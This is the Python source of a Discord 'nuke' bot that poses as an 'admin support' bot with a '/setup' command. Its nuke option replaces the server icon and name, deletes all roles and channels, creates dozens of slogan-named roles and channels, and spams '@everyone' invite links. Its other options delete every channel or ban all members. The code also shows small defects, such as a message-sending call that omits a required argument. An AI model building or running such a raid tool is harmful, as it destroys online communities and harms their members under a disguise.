import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import json
import datetime
import random
import os
import traceback # エラー時に詳細なトレースバックを出力するために追加
import string
# config.json の読み込みと環境変数からのトークン取得
def load_config():
    """
    config.json を読み込みます。ファイルがない場合はデフォルト設定を作成します。
    Discordトークンは環境変数 DISCORD_TOKEN から読み込むことを優先します。
    """
    config_path = 'config.json'
    config_data = {}

    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config_data = json.load(f)
    except FileNotFoundError:
        print("[INFO] config.json が見つかりません。デフォルト設定を作成します。")
        # トークンは環境変数で管理することを強く推奨します。
        # ここに記載するとセキュリティリスクがあります。
        # これは無効なプレースホルダーであり、実際には動作しません。
        default_config = {
            "token": "YOUR_DISCORD_BOT_TOKEN_HERE", # 環境変数から読み込まれることを期待
            "channels_to_create": 75,
            "channel_name": "URA ON TOP", # このデフォルト値は現在使用されていません
            "message": "@everyone discord.gg/8vHqDEYQ",
            "message_count": 60,
            "icon_url": "https://i.imgur.com/dRpsFUV.png"
        }
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, indent=2, ensure_ascii=False)
        config_data = default_config
    
    # 環境変数 DISCORD_TOKEN が存在すれば、それを優先して使用します
    env_token = os.getenv("DISCORD_TOKEN")
    if env_token:
        config_data["token"] = env_token
        print("[INFO] 環境変数からDiscordトークンを読み込みました。")
    
    # トークンが設定されていない、またはデフォルトのプレースホルダーのままの場合に警告
    if not config_data.get("token") or config_data["token"] == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print("[CRITICAL] Discordトークンが設定されていません！")
        print("           以下のいずれかの方法で設定してください:")
        print("           1. 環境変数 'DISCORD_TOKEN' にボットのトークンを設定する。")
        print("           2. 'config.json' ファイルの 'token' フィールドを編集する。")
        # 起動を停止するためにエラーを発生させるか、ユーザーに指示を出す
        # exit(1) でプログラムを終了させることも可能ですが、ここではエラーとして処理
        # bot.run() の LoginFailure で捕捉されるようにします。
    
    return config_data

config = load_config()

# Discordボットのインテント設定
# Nuke Botに必要な権限（メッセージ内容、ギルド情報、メンバー情報）
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

# ボットの初期化
# プレフィックスコマンドは使用しないため、command_prefix=None に設定
bot = commands.Bot(command_prefix=None, intents=intents)

# チャンネル名に使用する絵文字とランダムな文字列リスト
emoji_list = ['😀','😂','😎','😜','🤪','🥳','😡','🤯','💀','💀','👻','🤩','🤑','🤗','🤭','🤫','🤨','😈','😏','👿','☠','👹','💦','🕳️','👁‍🗨','🗯️','💯','💋','💜','🤎','🖤','🩶','🤍','🩵','💙','💚','💛','🧡','🩷','❤','❤️‍🩹','🙈','🙉','🙊','💌','💘','😾','😿','🧟','🚮','🚰','♿','🚹','🚺','🚻','🚼','⚠','🚸','🛑','⚛️','🕉️','✡','😇','🥰','😍','😘','😗','😙','😚','🥲','🫡','🥹','🥺','😭','😢','😤','😮‍💨','😩','😫','😵','😵‍💫','😱','😨','😰','😥','😓','🫠','🤥','😶','😶‍🌫️','😐','😑','😒','🙄','😬','🫡','😮','😯','😲','🥱','😪','🤤','🫥','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵‍💫','🥳','🤠','🥸','🥺','🥹','😇','😈','🤡','💩','👻','👽','🤖','🎃','😺','😸','😹','😻','😼','😽',]
channel_name_templates = ['URA ON TOP','このサーバーは裏ワザ帝国によって破壊されました','裏ワザ帝国最強!','裏ワザ帝国植民地へようこそ','URAWAZASAN ON TOP','裏ワザ帝国最強指導者 URAWAZASANに従おう','URAWAZASAN最強!',]
random_choice = string.ascii_letters + string.digits
emoji_suffix = ''.join(random.choices(emoji_list, k=random.randint(1, 20)))
message_with_suffix = f"{config['message']} | {random_choice}{emoji_suffix}"
@bot.event
async def on_ready():
    """ボットがDiscordにログインし、準備が完了した際に実行される処理"""
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print(f'Connected to {len(bot.guilds)} servers')
    await bot.change_presence(activity=discord.Game(name="admin support")) # ボットのアクティビティを設定
    try:
        await bot.tree.sync() # スラッシュコマンドをDiscordと同期
        print("Slash commands synced successfully.")
    except Exception as e:
        print(f"[ERROR] Error syncing slash commands: {e}")
        traceback.print_exc() # エラーの詳細なスタックトレースを出力

async def send_bot_messages(channel: discord.TextChannel, message: str, count: int):
    """
    指定されたチャンネルに複数回メッセージを送信します。
    レートリミットを考慮し、エラー発生時には追加の待機時間を設けます。
    """
    for i in range(count):
        try:
            await channel.send(message)
            # 頻繁なメッセージ送信によるレートリミットを考慮し、待機
            await asyncio.sleep(1.5)
        except discord.HTTPException as e:
            print(f"[ERROR] [SendMessages] Failed to send message in channel '{channel.name}' (ID: {channel.id}): {e} (Attempt {i+1}/{count})")
            # レートリミットエラーなど、HTTP関連のエラーの場合、少し長めに待機
            await asyncio.sleep(5) 
        except Exception as e:
            print(f"[ERROR] [SendMessages] An unexpected error occurred while sending message in channel '{channel.name}' (ID: {channel.id}): {e}")
            traceback.print_exc()

@bot.tree.command(name="setup", description="🔧 Nuke/Clear/Allban operations for the server.")
@app_commands.describe(
    action="実行する操作を選択してください: nuke, clear, allban"
)
@app_commands.choices(action=[
    app_commands.Choice(name="start", value="nuke"),
    app_commands.Choice(name="Clear", value="clear"),
    app_commands.Choice(name="ban", value="allban"),
])
async def setup(interaction: discord.Interaction, action: app_commands.Choice[str]):
    """サーバーのNuke, Clear, Allban操作を実行します。"""
    
    # コマンド実行が完了するまで思考状態を表示
    await interaction.response.defer(thinking=True, ephemeral=False) # ephemeral=False で全員に見えるように

    guild = interaction.guild
    now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    
    # コマンド実行ユーザーが管理者権限を持っているかチェック
    if not interaction.user.guild_permissions.administrator:
        print(f"[{now}] [WARNING] User {interaction.user} attempted '{action.value}' command without administrator permissions.")
        await interaction.followup.send("❌ あなたにはこのコマンドを実行するための管理者権限がありません。", ephemeral=True)
        return

    print(f"[{now}] [INFO] '{action.value}' command initiated by {interaction.user} (ID: {interaction.user.id}) in guild '{guild.name}' (ID: {guild.id})")

    if action.value == "nuke":
        # Nuke操作には管理者権限がある前提で、各サブ操作に必要な権限をチェック
        
        # 1. サーバーアイコン変更
        print(f"[{now}] [STEP 1/5] Starting icon change process...")
    
        icon_bytes = None
        icon_path = config.get("icon_path") # config.json から icon_path を取得
        
        if icon_path: # icon_path が設定されている場合
            # ボットの実行ファイルからの相対パスでファイルを探す
            base_dir = os.path.dirname(os.path.abspath(__file__)) # 現在のスクリプトのディレクトリを取得
            full_icon_path = os.path.join(base_dir, icon_path)
            
            if os.path.exists(full_icon_path):
                try:
                    with open(full_icon_path, 'rb') as f: # バイナリ読み込みモードで開く
                        icon_bytes = f.read()
                    print(f"[{now}] [DEBUG] Loaded icon from local path: {full_icon_path}")
                except Exception as e:
                    print(f"[{now}] [ERROR] Failed to load icon from local path '{full_icon_path}': {e}")
                    traceback.print_exc()
            else:
                print(f"[{now}] [ERROR] Local icon file not found at: {full_icon_path}")
        else:
            print(f"[{now}] [INFO] 'icon_path' is not set in config.json. Skipping local icon load.")
        
        # もしローカルファイルからの読み込みが失敗した場合、または icon_path が設定されていなかった場合、
        # 以前の icon_url からのダウンロードロジックも残しておくことができますが、
        # Imgurのレートリミットを避けるためにはローカルファイル優先が推奨です。
        # 以下は、icon_path が設定されていない、またはファイルが存在しない場合に
        # fallback として icon_url を試す場合のコードです。
        if not icon_bytes and config.get("icon_url"): # icon_bytes がまだない場合、icon_url を試す
            icon_url = config.get("icon_url")
            try:
                print(f"[{now}] [DEBUG] Attempting to download icon from URL (fallback): {icon_url}")
                async with aiohttp.ClientSession() as session: 
                    async with session.get(icon_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        print(f"[{now}] [DEBUG] HTTP Status for icon download: {resp.status}")

                        if resp.status == 200:
                            icon_bytes = await resp.read()
                            print(f"[{now}] [DEBUG] Downloaded {len(icon_bytes)} bytes for icon.")
                        else:
                            print(f"[{now}] [ERROR] HTTP {resp.status} error: Failed to download icon image from {icon_url}.")
                            
            except asyncio.TimeoutError:
                print(f"[{now}] [ERROR] Timeout: Image download took longer than 10 seconds from {icon_url}.")
            except aiohttp.ClientError as e:
                print(f"[{now}] [ERROR] aiohttp client error during icon download: {type(e).__name__}: {e}")
            except Exception as e:
                print(f"[{now}] [ERROR] Unexpected error during icon download: {type(e).__name__}: {e}")
                traceback.print_exc()
        # ★修正部分ここまで★

        if not icon_bytes:
            print(f"[{now}] [INFO] No valid icon_bytes obtained. Skipping icon change.")
        elif not guild.me.guild_permissions.manage_guild:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Server' permission. Cannot change server icon. Skipping.")
        else:
            if len(icon_bytes) > 262144: # Discordのアイコンサイズ制限: 256KB
                print(f"[{now}] [ERROR] Icon image is too large: {len(icon_bytes)} bytes (Max: 262144 bytes). Skipping icon change.")
            elif len(icon_bytes) == 0:
                print(f"[{now}] [ERROR] Icon image data is empty. Skipping icon change.")
            else:
                print(f"[{now}] [DEBUG] Attempting to change server icon...")
                try:
                    await guild.edit(icon=icon_bytes, reason=f"Icon changed by {interaction.user}")
                    print(f"[{now}] [SUCCESS] Server icon changed successfully!")
                except discord.Forbidden:
                    print(f"[{now}] [ERROR] Discord API Error: Missing Permissions (Forbidden). Bot requires 'Manage Server' permission to change icon.")
                except discord.HTTPException as e:
                    print(f"[{now}] [ERROR] Discord API Error ({e.status}): {e.text}. Failed to change icon.")
                except Exception as e:
                    print(f"[{now}] [ERROR] Unexpected error while changing icon: {type(e).__name__}: {e}")
                    traceback.print_exc()

        # 2. サーバー名変更
        print(f"[{now}] [STEP 2/5] Changing server name...")
        if not guild.me.guild_permissions.manage_guild:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Server' permission. Cannot change server name. Skipping.")
        else:
            try:
                await guild.edit(name="裏ワザ帝国の植民地", reason=f"Server name changed by {interaction.user}")
                print(f"[{now}] [SUCCESS] Server name changed successfully!")
            except discord.Forbidden:
                print(f"[{now}] [ERROR] Discord API Error: Missing Permissions (Forbidden). Bot requires 'Manage Server' permission to change name.")
            except Exception as e:
                print(f"[{now}] [ERROR] Failed to change server name: {e}")
                traceback.print_exc()
                
         # 3. 全ロール削除
        print(f"[{now}] [STEP 3/7] Deleting all existing roles...")
        if not guild.me.guild_permissions.manage_roles:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Roles' permission. Cannot delete roles. Skipping.")
            deleted_roles_count = 0
            failed_role_deletions = len(guild.roles)
        else:
            role_deletion_tasks = []
            for role in guild.roles:
                # @everyone ロールは削除できない
                if role.is_default():
                    continue
                # ボットのロールより上位のロールは削除できない
                if role >= guild.me.top_role:
                    print(f"[{now}] [INFO] Skipping role '{role.name}' (higher than bot's role)")
                    continue
                role_deletion_tasks.append(asyncio.create_task(role.delete(reason=f"Nuked by {interaction.user}")))
            
            role_results = await asyncio.gather(*role_deletion_tasks, return_exceptions=True)
            deleted_roles_count = sum(1 for r in role_results if not isinstance(r, Exception))
            failed_role_deletions = sum(1 for r in role_results if isinstance(r, Exception))
            print(f"[{now}] [SUCCESS] Role deletion complete. Successfully deleted {deleted_roles_count} roles, {failed_role_deletions} failed.")

        # 4. 全チャンネル削除
        print(f"[{now}] [STEP 4/7] Deleting all existing channels...")
        if not guild.me.guild_permissions.manage_channels:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Channels' permission. Cannot delete channels. Skipping.")
            deleted_count = 0
            failed_deletions = len(guild.channels)
        else:
            deletion_tasks = []
            for ch in guild.channels:
                deletion_tasks.append(asyncio.create_task(ch.delete(reason=f"Nuked by {interaction.user}")))
            
            results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
            deleted_count = sum(1 for r in results if not isinstance(r, Exception))
            failed_deletions = sum(1 for r in results if isinstance(r, Exception))
            print(f"[{now}] [SUCCESS] Channel deletion complete. Successfully deleted {deleted_count} channels, {failed_deletions} failed.")

        # 5. 新規ロール作成
        print(f"[{now}] [STEP 5/7] Creating {config.get('roles_to_create', 50)} new roles...")
        success_created_roles = []
        if not guild.me.guild_permissions.manage_roles:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Roles' permission. Cannot create roles. Skipping.")
        else:
            role_creation_tasks = []
            role_name_templates = config.get('role_name_templates', ['裏ワザ帝国メンバー', 'URAWAZASAN軍団', '植民地住民', 'URA ON TOP'])
            
            for _ in range(config.get('roles_to_create', 50)):
                emoji_suffix = ''.join(random.choices(emoji_list, k=random.randint(1, 10)))
                role_suffix = random.choice(role_name_templates)
                random_suffix = ''.join(random.choices(random_choice, k=random.randint(4, 12)))
                role_name = f"{role_suffix}|{random_suffix}{emoji_suffix}"
                
                # ランダムな色を生成
                random_color = discord.Color(random.randint(0, 0xFFFFFF))
                
                role_creation_tasks.append(asyncio.create_task(
                    guild.create_role(
                        name=role_name,
                        color=random_color,
                        reason=f"Nuked by {interaction.user}"
                    )
                ))
            
            created_roles = await asyncio.gather(*role_creation_tasks, return_exceptions=True)
            success_created_roles = [r for r in created_roles if not isinstance(r, Exception)]
            failed_role_creations = sum(1 for r in created_roles if isinstance(r, Exception))
            print(f"[{now}] [SUCCESS] Created {len(success_created_roles)} roles successfully, {failed_role_creations} failed.")
            
    
        # 4. 新規チャンネル作成
        print(f"[{now}] [STEP 4/5] Creating {config['channels_to_create']} new channels...")
        success_created_channels = []
        if not guild.me.guild_permissions.manage_channels:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Channels' permission. Cannot create channels. Skipping.")
        else:
            creation_tasks = []
            for _ in range(config['channels_to_create']):
                # ランダムな絵文字とチャンネル名を組み合わせる。絵文字の数をランダムに調整
                emoji_suffix = ''.join(random.choices(emoji_list, k=random.randint(1, 12))) 
                channel_suffix = random.choice(channel_name_templates) # k=1は不要
                random_suffix = ''.join(random.choices(random_choice, k=random.randint(6, 20)))
                channel_name = f"{channel_suffix}|{random_suffix}{emoji_suffix}"
                creation_tasks.append(asyncio.create_task(
                    guild.create_text_channel(channel_name, reason=f"Nuked by {interaction.user}")
                ))
            created_channels = await asyncio.gather(*creation_tasks, return_exceptions=True)
            success_created_channels = [c for c in created_channels if not isinstance(c, Exception)]
            failed_creations = sum(1 for r in created_channels if isinstance(r, Exception))
            print(f"[{now}] [SUCCESS] Created {len(success_created_channels)} channels successfully, {failed_creations} failed.")

        # 5. メッセージ送信
        print(f"[{now}] [STEP 5/5] Sending messages to created channels...")
        if not guild.me.guild_permissions.send_messages:
            print(f"[{now}] [ERROR] Bot lacks 'Send Messages' permission. Cannot send messages. Skipping.")
        else:
            msg_tasks = [
                asyncio.create_task(send_bot_messages(ch, message_with_suffix,))
                for ch in success_created_channels # 成功したチャンネルにのみメッセージを送る
            ]
            await asyncio.gather(*msg_tasks, return_exceptions=True)
            print(f"[{now}] [SUCCESS] Message sending complete.")

        print(f"[{now}] [COMPLETED] NUKE operation completed by {interaction.user}. Created {len(success_created_channels)} channels.")
        await interaction.followup.send(f"✅ NUKE完了: {len(success_created_channels)} チャンネルを作成し、メッセージを送信しました。")

    elif action.value == "clear":
        print(f"[{now}] [INFO] Starting CLEAR operation (deleting all channels)...")
        if not guild.me.guild_permissions.manage_channels:
            print(f"[{now}] [ERROR] Bot lacks 'Manage Channels' permission. Cannot perform CLEAR operation.")
            await interaction.followup.send("❌ チャンネルを削除するための`チャンネルの管理`権限がありません。", ephemeral=True)
            return

        deletion_tasks = [
            asyncio.create_task(ch.delete(reason=f"Server clear by {interaction.user}"))
            for ch in guild.channels
        ]
        results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
        deleted_count = sum(1 for r in results if not isinstance(r, Exception))
        failed_deletions = sum(1 for r in results if isinstance(r, Exception))

        print(f"[{now}] [COMPLETED] CLEAR operation completed by {interaction.user}. Deleted {deleted_count} channels, {failed_deletions} failed.")
        await interaction.followup.send(f"✅ CLEAR完了: {deleted_count} チャンネルを削除しました。")

    elif action.value == "allban":
        print(f"[{now}] [INFO] Starting ALLBAN operation (banning all members)...")
        if not guild.me.guild_permissions.ban_members:
            print(f"[{now}] [ERROR] Bot lacks 'Ban Members' permission. Cannot perform ALLBAN operation.")
            await interaction.followup.send("❌ メンバーをBANするための`メンバーをBANする`権限がありません。", ephemeral=True)
            return

        members_to_ban = []
        for m in guild.members:
            # ボット自身はBANしない
            if m.id == bot.user.id:
                print(f"[{now}] [INFO] Skipping bot user {m.name} (ID: {m.id}) from ALLBAN.")
                continue
            # サーバーオーナーはBANできない
            if m.id == guild.owner_id:
                print(f"[{now}] [INFO] Skipping guild owner {m.name} (ID: {m.id}) from ALLBAN.")
                continue
            # ボットよりロール階層が高いメンバーはBANできない
            # m.top_role と guild.me.top_role が存在し、比較可能であることを確認
            if m.top_role and guild.me.top_role and m.top_role >= guild.me.top_role:
                print(f"[{now}] [INFO] Skipping member {m.name} (ID: {m.id}) with equal or higher role than bot from ALLBAN.")
                continue
            members_to_ban.append(m)

        if not members_to_ban:
            print(f"[{now}] [INFO] No eligible members to ban found.")
            await interaction.followup.send("ℹ️ BANできるメンバーが見つかりませんでした (ボット、オーナー、上位ロールのメンバーはスキップされます)。")
            return

        ban_tasks = [
            asyncio.create_task(guild.ban(m, reason=f"Allban by {interaction.user}"))
            for m in members_to_ban
        ]
        results = await asyncio.gather(*ban_tasks, return_exceptions=True)
        banned_count = sum(1 for r in results if not isinstance(r, Exception))
        failed_bans = sum(1 for r in results if isinstance(r, Exception))

        print(f"[{now}] [COMPLETED] ALLBAN operation completed by {interaction.user}. Banned {banned_count} members, {failed_bans} failed.")
        await interaction.followup.send(f"✅ ALLBAN完了: {banned_count} メンバーをBANしました。")

if __name__ == "__main__":
    print("Starting bot...")
    # トークンが設定されているか最終チェック
    if not config.get("token") or config["token"] == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print("[CRITICAL] Discordトークンが設定されていません。ボットを起動できません。")
        # トークンがない場合は、LoginFailureではなく直接終了させる
        exit(1) 
        
    # トークンの最初の20文字のみを表示してログに記録（セキュリティのため）
    print(f"Token: {config['token'][:20]}...")
    try:
        # トークンが有効でない場合 discord.LoginFailure が発生
        bot.run(config["token"])
    except discord.LoginFailure:
        print("[ERROR] 無効なトークンです!config.jsonまたは環境変数を確認してください。")
        print("        トークンは Discord Developer Portal から取得したボットのトークンである必要があります。")
    except Exception as e:
        print(f"[ERROR] ボットの起動中に予期せぬエラーが発生しました: {e}")
        traceback.print_exc()